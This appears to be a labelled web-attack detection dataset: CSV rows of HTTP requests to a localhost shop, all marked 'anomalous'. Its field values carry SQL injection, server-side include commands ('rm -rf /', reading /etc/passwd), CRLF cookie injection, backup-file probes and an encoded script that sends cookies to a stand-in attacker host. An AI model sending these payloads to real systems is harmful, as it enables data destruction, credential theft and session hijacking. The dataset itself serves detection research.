POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=loralyn&password=95en6e4a3&nombre=Acucio&apellidos=Bone&email=dutt%40cincocolores.vg&dniA=86534861Y&direccion=San+Francisco+S%2FN%2C+&ciudad=Labajos&cp=50373&provincia=Asturias&ntc=1248447866844219&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/global/creditos.jsp/asf-logo-wide.gif/.BAK,,anomalous
GET,http://localhost:8080/tienda1/global/estilos.css/4861362529278789730.inc,,anomalous
GET,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg/.bak,,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=robbie&password=7nexor40ilidad&nombre=Milet&apellidos=Alles+Araujo&email=adix_adam%40easyviaggio.com.km&dni=56876585T&direccion=Calle+Juan+Montilla%2C+50+1-A&ciudad=Paterna&cp=45870%27+DELETE+FROM+USERS&provincia=Navarra&ntc=9173328900592385&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=robbie&password=7nexor40ilidad&nombre=Milet&apellidos=Alles+Araujo&email=adix_adam%40easyviaggio.com.km&dni=56876585T&direccion=Calle+Juan+Montilla%2C+50+1-A&ciudad=Paterna&cp=45870%27+DELETE+FROM+USERS&provincia=Navarra&ntc=9173328900592385&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=robbie&password=7nexor40ilidad&nombre=Milet&apellidos=Alles+Araujo&email=adix_adam%40easyviaggio.com.km&dni=56876585T&direccion=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&ciudad=Paterna&cp=45870&provincia=Navarra&ntc=9173328900592385&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=robbie&password=7nexor40ilidad&nombre=Milet&apellidos=Alles+Araujo&email=adix_adam%40easyviaggio.com.km&dni=56876585T&direccion=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&ciudad=Paterna&cp=45870&provincia=Navarra&ntc=9173328900592385&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=robbie&password=7nexor40ilidad&nombre=Milet&apellidos=Alles+Araujo&email=adix_adam%40easyviaggio.com.km&dni=56876585T&direccion=Calle+Juan+Montilla%2C+50+1-A&ciudad=Paterna&cp=1949A&provincia=Navarra&ntc=9173328900592385&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=robbie&password=7nexor40ilidad&nombre=Milet&apellidos=Alles+Araujo&email=adix_adam%40easyviaggio.com.km&dni=56876585T&direccion=Calle+Juan+Montilla%2C+50+1-A&ciudad=Paterna&cp=1949A&provincia=Navarra&ntc=9173328900592385&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=robbie&password=7nexor40ilidad&nombre=Milet&apellidos=Alles+Araujo&email=adix_adam%40easyviaggio.com.km&dni=56876585T&direccion=Calle+Juan+Montilla%2C+50+1-A&ciudad=Paterna&cp=45870&provincia=Navarra&ntc=9173328900592385&B1A=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=robbie&password=7nexor40ilidad&nombre=Milet&apellidos=Alles+Araujo&email=adix_adam%40easyviaggio.com.km&dni=56876585T&direccion=Calle+Juan+Montilla%2C+50+1-A&ciudad=Paterna&cp=45870&provincia=Navarra&ntc=9173328900592385&B1A=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/fotos.jsp/4861362529278789730.Old,,anomalous
GET,http://localhost:8080/tienda1/imagenes/cmenbul.gif/4861362529278789730,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n%27+Ib%E9ric-%27o&precio=100&cantidad=47&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=Jam%F3n%27+Ib%E9ric-%27o&precio=100&cantidad=47&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=100&cantidadA=47&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=Vino+Rioja&precio=100&cantidadA=47&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=krishna&pwd=3o%3F964I7A1&remember=on&B1=Entrar%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=krishna&pwd=3o%3F964I7A1&remember=on&B1=Entrar%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=krishna&pwd=%2Cb%2F%FAB%2CalO&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=krishna&pwd=%2Cb%2F%FAB%2CalO&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=krishna&pwdA=3o%3F964I7A1&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=krishna&pwdA=3o%3F964I7A1&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/servlet/snoop,,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%4040,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=1%4040,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%27OR%27a%3D%27a,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=%27OR%27a%3D%27a,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=1,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp.Old,,anomalous
PUT,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp/4861362529278789730~,,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9801&B1=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=9801&B1=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9801&B1=Confirmar%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=9801&B1=Confirmar%2F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=9801&B1=Pasar+por+caja,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precioA=9801&B1=Pasar+por+caja,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tjia&password=ajenamiento&nombre=Am%E9rica&apellidos=Gramunt+Alzuria&email=anglim%40emepleo.bj&dni=56967582D&direccion=Pl.+Jose+Asenjo+Sedano%2C+106+&ciudadA=Benitagla&cp=08186&provincia=Barcelona&ntc=7288239379132371&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=tjia&password=ajenamiento&nombre=Am%E9rica&apellidos=Gramunt+Alzuria&email=anglim%40emepleo.bj&dni=56967582D&direccion=Pl.+Jose+Asenjo+Sedano%2C+106+&ciudadA=Benitagla&cp=08186&provincia=Barcelona&ntc=7288239379132371&B1=Registrar,anomalous
PUT,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080/servlet/HelloWorldServlet,,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&password=l53%2420a5i5&nombre=Epuyen&apellidos=Monz%F3+Turu&email=treacher-johnson%40pinturasultravioleta.mk&dni=93658215F&direccion=Urbanizacion+Montesion%2C+3+&ciudad=Aoiz%2FAgoitz&cp=39640&provincia=Salamanca&ntc=1895469011099422&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&password=l53%2420a5i5&nombre=Epuyen&apellidos=Monz%F3+Turu&email=treacher-johnson%40pinturasultravioleta.mk&dni=93658215F&direccion=Urbanizacion+Montesion%2C+3+&ciudad=Aoiz%2FAgoitz&cp=39640&provincia=Salamanca&ntc=1895469011099422&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=noeschka&password=l53%2420a5i5&nombre=Epuyen&apellidos=Monz%F3+Turu&email=treacher-johnson%40pinturasultravioleta.mk&dni=93658215F&direccion=Urbanizacion+Montesion%2C+3+&ciudad=Aoiz%2FAgoitz&cp=4382A&provincia=Salamanca&ntc=1895469011099422&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=noeschka&password=l53%2420a5i5&nombre=Epuyen&apellidos=Monz%F3+Turu&email=treacher-johnson%40pinturasultravioleta.mk&dni=93658215F&direccion=Urbanizacion+Montesion%2C+3+&ciudad=Aoiz%2FAgoitz&cp=4382A&provincia=Salamanca&ntc=1895469011099422&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=noeschka&password=l53%2420a5i5&nombre=Epuyen&apellidos=Monz%F3+Turu&email=treacher-johnson%40pinturasultravioleta.mk&dni=93658215F&direccionA=Urbanizacion+Montesion%2C+3+&ciudad=Aoiz%2FAgoitz&cp=39640&provincia=Salamanca&ntc=1895469011099422&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=noeschka&password=l53%2420a5i5&nombre=Epuyen&apellidos=Monz%F3+Turu&email=treacher-johnson%40pinturasultravioleta.mk&dni=93658215F&direccionA=Urbanizacion+Montesion%2C+3+&ciudad=Aoiz%2FAgoitz&cp=39640&provincia=Salamanca&ntc=1895469011099422&B1=Registrar,anomalous
GET,http://localhost:8080/asf-logo-wide.java,,anomalous
GET,http://localhost:8080/CFIDE/administrator/welcomefooter.cfm,,anomalous
GET,http://localhost:8080/tienda1/miembros/fotos.jsp/6909030637832563290.jsp,,anomalous
GET,http://localhost:8080/tienda1~,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85%257C&cantidad=71&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=Queso+Manchego&precio=85%257C&cantidad=71&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=%27OR%27a%3D%27a&cantidad=71&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=Queso+Manchego&precio=%27OR%27a%3D%27a&cantidad=71&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39%2F&cantidad=71&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=Queso+Manchego&precio=39%2F&cantidad=71&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidadA=71&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=Queso+Manchego&precio=85&cantidadA=71&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=moyna&pwd=arable&remember=on&B1=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=moyna&pwd=arable&remember=on&B1=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=je%3Fanes&pwd=arable&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=je%3Fanes&pwd=arable&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=moyna&pwdA=arable&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=moyna&pwdA=arable&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=+,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=+,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27+DELETE+FROM+USERS,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%27+DELETE+FROM+USERS,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=112&B1=Pasar+por+cajaany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=112&B1=Pasar+por+cajaany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=%257C&precio=112&B1=Pasar+por+caja,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=%257C&precio=112&B1=Pasar+por+caja,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=112&B1=Pasar+por+caja%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=112&B1=Pasar+por+caja%2F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=112&B1=Pasar+por+caja,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modoA=insertar&precio=112&B1=Pasar+por+caja,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=wilkinso&password=chubasque4o&nombre=Rawd%2Con&apellidos=Bugnone&email=hartigan%40porqueagel.mc&dni=54839907H&direccion=Calle+San+Braulio%2C+198+&ciudad=Longares&cp=08440&provincia=Burgos&ntc=3980165808897120&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=wilkinso&password=chubasque4o&nombre=Rawd%2Con&apellidos=Bugnone&email=hartigan%40porqueagel.mc&dni=54839907H&direccion=Calle+San+Braulio%2C+198+&ciudad=Longares&cp=08440&provincia=Burgos&ntc=3980165808897120&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=wilkinso&password=chubasque4o&nombre=Tideo&apellidos=Bugnone&email=hartigan%40porqueagel.mc&dni=54839907H&direccion=Calle+San+Braulio%2C+198+&ciudad=Longares&cp=08440&provinciaA=Burgos&ntc=3980165808897120&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=wilkinso&password=chubasque4o&nombre=Tideo&apellidos=Bugnone&email=hartigan%40porqueagel.mc&dni=54839907H&direccion=Calle+San+Braulio%2C+198+&ciudad=Longares&cp=08440&provinciaA=Burgos&ntc=3980165808897120&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%7C,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=%7C,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080/tienda1/global/titulo.jsp.Inc,,anomalous
GET,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg.inc,,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dal%27li&password=4107nD%E1&nombre=Shunko&apellidos=Brio+Bertorelli&email=griffen7%40docerosas.no&dni=71766334D&direccion=Calle+Gitanillos+De+Cadiz+96+2%3FH&ciudad=Cala%F1as&cp=24234&provincia=Palencia&ntc=5502025847715337&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=dal%27li&password=4107nD%E1&nombre=Shunko&apellidos=Brio+Bertorelli&email=griffen7%40docerosas.no&dni=71766334D&direccion=Calle+Gitanillos+De+Cadiz+96+2%3FH&ciudad=Cala%F1as&cp=24234&provincia=Palencia&ntc=5502025847715337&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/salir.jsp/asf-logo-wide,,anomalous
GET,http://localhost:8080/asf-logo-wide,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&cantidad=67&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=Queso+Manchego&precio=39sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&cantidad=67&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39&cantidad=67&B1=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=Queso+Manchego&precio=39&cantidad=67&B1=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=1%2F&nombre=Queso+Manchego&precio=39&cantidad=67&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=1%2F&nombre=Queso+Manchego&precio=39&cantidad=67&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precioA=39&cantidad=67&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=Queso+Manchego&precioA=39&cantidad=67&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=dar-dersessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&pwd=caser%EDa&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=dar-dersessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&pwd=caser%EDa&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=dar-der&pwd=3.ra9di%2F2sa%2Cm55te&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=dar-der&pwd=3.ra9di%2F2sa%2Cm55te&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modoA=entrar&login=dar-der&pwd=caser%EDa&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modoA=entrar&login=dar-der&pwd=caser%EDa&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=2,anomalous
GET,http://localhost:8080/webapp/examples/HitCount,,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%4040,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas%4040,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8122&B1=Confirmar%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=8122&B1=Confirmar%2F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8122&B1A=Confirmar,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=8122&B1A=Confirmar,anomalous
GET,http://localhost:8080/tienda1/publico.Bak,,anomalous
PUT,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080/IISSamples/sdk/asp/docs/toolbar.asp,,anomalous
GET,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg/asf-logo-wide,,anomalous
GET,http://localhost:8080/tienda1/miembros/imagenes.OLD,,anomalous
GET,http://localhost:8080/tienda1/4861362529278789730.BAK,,anomalous
